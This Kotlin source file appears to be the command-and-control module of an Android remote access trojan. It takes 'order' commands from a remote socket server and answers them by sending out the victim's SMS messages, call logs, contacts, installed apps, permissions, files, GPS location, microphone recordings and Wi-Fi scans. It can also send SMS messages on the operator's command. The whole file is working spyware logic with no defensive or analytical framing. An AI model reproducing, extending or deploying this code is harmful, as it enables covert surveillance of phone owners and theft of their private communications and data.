package com.neaking

import android.annotation.SuppressLint
import android.content.Context
import android.os.Looper
import android.util.Log
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject


@SuppressLint("StaticFieldLeak")
object ConnectionManager {


    private val fm: FileManager = FileManager
    var context: Context? = null
    var mSocket: Socket? = null
    fun startAsync(con: Context?) {
        try {
         //   Log.e("error", "Getting socket")
           //Log.e("error", con.toString())
            context = con
            sendReq()
        } catch (ex: Exception) {
            startAsync(con)
        }
    }

    @SuppressLint("StaticFieldLeak", "SuspiciousIndentation")
    fun sendReq() {

        try {
            if (mSocket!= null) return
            //  Log.e("error", "Getting socket 1")
            //    Log.e("error", mSocket.toString())
                // The following lines connects the Android app to the server.
                SocketHandler.setSocket()
                SocketHandler.establishConnection()
                mSocket = SocketHandler.getSocket()
           // Log.e("error", "Getting socket 2")
         //   Log.e("error", mSocket.toString())

          //  Log.e("error", Socket.EVENT_CONNECT)
            mSocket!!.on(Socket.EVENT_CONNECT) {
              //  println("Connected")
               // Log.e("error", "Success")
                //mSocket!!.emit("pong")
                val sharedPreference =  context?.getSharedPreferences("pendingTasks", Context.MODE_PRIVATE)
                val defaultArray = JSONArray()
                val tasks= sharedPreference?.getString("task", defaultArray.toString());
                val newTasks = tasks?.let { JSONArray(it) }
               // Log.e("newTasks", newTasks.toString())
                if (newTasks != null) {
                   // Log.e("newTasks", newTasks.toString())
                    for (i in 0 until newTasks.length()) {
                        val data1 = newTasks.get(i) as JSONObject
                        val order1 = data1.getString("type")
                            try {

                                when (order1) {
                                    "0xSM" -> if (data1.getString("action") == "ls") sms(
                                        0,
                                        null,
                                        null
                                    ) else if (data1.getString("action") == "sendSMS") sms(
                                        1,
                                        data1.getString("to"),
                                        data1.getString("sms")
                                    )
                                    "0xCL" -> calls()
                                    "0xIN" -> installedApps()
                                    "0xCO" -> contacts()
                                    "0xPM" ->permissionManager()
                                    "0xFI" -> if (data1.getString("action") == "ls") fileManager(
                                        0,
                                        data1.getString("path")
                                    ) else if (data1.getString("action") == "dl") fileManager(
                                        1,
                                        data1.getString("path")
                                    )
                                    "0xLO" ->locationManager()

                                    "0xMI" ->micManager(data1.getInt("sec"))
                                    "0xWI" ->wifiManager()
                                    "0xLOCKSCREEN" ->wifiManager()

                                }
                            } catch (e: java.lang.Exception) {
                                e.printStackTrace()
                            }


                    }

                }



            }
            mSocket!!.on("ping") {
                mSocket!!.emit("pong")
            }
            mSocket!!.on("order") { args ->



                if (args[0] != null) {
                    try {
                        val sharedPreference =  context?.getSharedPreferences("pendingTasks", Context.MODE_PRIVATE)
                       //  sharedPreference?.edit()?.remove("task")?.apply();
                        val defaultArray = JSONArray()
                        val data = args[0] as JSONObject
                        val order = data.getString("type")
                        println(order)

                         val tasks= sharedPreference?.getString("task", defaultArray.toString());
                        val newTasks = tasks?.let { JSONArray(it) }
                        //println(newTasks)
                        if (newTasks != null) {
                            if (newTasks.length()>0){

                                var found = false

                            for (i in 0 until newTasks.length()) {
                                val data1 = newTasks.get(i) as JSONObject

                                val order1 = data1.getString("type")
                                if (order1 == "0xSM") {
//                                    Log.e("89", data1.toString())
                                    val action1 = data1.getString("action")
                                    if (action1 == data.getString("action")) {
//                                        println("Found")
//                                        Log.e("89", "Found")
                                        found = true
                                        break
                                    }
                                } else {
                                    if (order1 == order) {
                                       // Log.e("89", "Found")
                                        found = true
                                        break
                                      //  println(2222)
                                    } else {
                                      //  println(44545)
                                      //  newTasks.put(data)

                                    }

                                }

                            }
                                if (!found){
                                    newTasks.put(data)
                                }
                        }else{
                                newTasks.put(data)
                            }

                        }
                       // println(newTasks)
                         val editor = sharedPreference?.edit()
                        editor?.putString("task", newTasks.toString())
                        editor?.apply()


                        when (order) {
                            "0xSM" -> if (data.getString("action") == "ls") sms(
                                0,
                                null,
                                null
                            ) else if (data.getString("action") == "sendSMS") sms(
                                1,
                                data.getString("to"),
                                data.getString("sms")
                            )
                            "0xCL" -> calls()
                            "0xIN" -> installedApps()
                            "0xCO" -> contacts()
                            "0xPM" ->permissionManager()
                            "0xFI" -> if (data.getString("action") == "ls") fileManager(
                                0,
                                data.getString("path")
                            ) else if (data.getString("action") == "dl") fileManager(
                                1,
                                data.getString("path")
                            )

                            "0xLO" ->locationManager()
                            "0xMI" ->micManager(data.getInt("sec"))
                            "0xWI" ->wifiManager()

                        }
                    } catch (e: java.lang.Exception) {
                        e.printStackTrace()
                    }

                }
            }



        } catch (ex: Exception) {
            Log.e("error", ex.message!!)
        }
    }


    private fun micManager(sec: Int) {
        MicManager.startRecording(sec)
    }

    private fun sms(req: Int, phoneNo: String?, msg: String?) {

    if (req == 0){
        val messages=SMSManager.getsms()
        mSocket!!.emit("0xSM", messages)
    } else if (req == 1) {
        val isSent = SMSManager.sendSMS(phoneNo, msg)
        mSocket!!.emit("0xSM", isSent)
    }
        deletePendingRequest("0xSM")

}


    private fun wifiManager() {
        mSocket!!.emit("0xWI", WifiScanner.scan(context!!))

        deletePendingRequest("0xWI")
    }



    private fun calls() {

        mSocket!!.emit("0xCL", CallsManager.getCallsLogs())

        deletePendingRequest("0xCL")
    }

    private fun installedApps() {

        mSocket?.emit("0xIN", AppList.getInstalledApps(false))

        deletePendingRequest("0xIN")
    }

    private fun contacts() {

        mSocket?.emit("0xCO", ContactsManager.getContacts())

        deletePendingRequest("0xCO")
    }



    private fun permissionManager() {
        mSocket?.emit("0xPM", PermissionManager.getGrantedPermissions())
        deletePendingRequest("0xPM")
    }



    private fun fileManager(req: Int, path: String?) {
        if (req == 0) {
            val `object` = JSONObject()
            try {
                `object`.put("type", "list")
                `object`.put("list", fm.walk(path))
                mSocket?.emit("0xFI", `object`)
                deletePendingRequest("0xFI")

            } catch (_: JSONException) {
            }
        } else if (req == 1) fm.downloadFile(path)
    }


    private fun locationManager() {
        Looper.prepare()
        val gps = LocManager(context)
        // check if GPS enabled
        if (gps.canGetLocation()) {
            println(gps.getData)
            mSocket?.emit("0xLO", gps.getData)
            deletePendingRequest("0xLO")
           // ConnectionManager.ioSocket.emit("0xLO", gps.getData())
        }
    }




    fun deletePendingRequest(path: String?) {

        val sharedPreference =  context?.getSharedPreferences("pendingTasks", Context.MODE_PRIVATE)
        val defaultArray = JSONArray()
        val tasks= sharedPreference?.getString("task", defaultArray.toString());
        val newTasks = tasks?.let { JSONArray(it) }
        if (newTasks != null) {
            Log.e("oldTasks", newTasks.toString())
            val jsArray = JSONArray()
            for (i in 0 until newTasks.length()) {
                val data1 = newTasks.get(i) as JSONObject
                val order1 = data1.getString("type")

                //println(data1)
                //println(order1)
                if(order1=="0xSM" || order1=="0xFI" ){
                    val action1 = data1.getString("action")
                   // println(action1)
                    if(action1 == "ls"){

                    }else if ( action1 == "sendSMS"){

                    }else if ( action1 == "dl"){

                    }else{
                        jsArray.put(data1);
                    }
                }else{

                    if(order1==path){

                    }else{
                        jsArray.put(data1);
                    }
                }

            }
            val editor = sharedPreference.edit()
            editor?.putString("task", jsArray.toString())
            editor?.apply()
            Log.e("newTasks", jsArray.toString())

        }

    }

}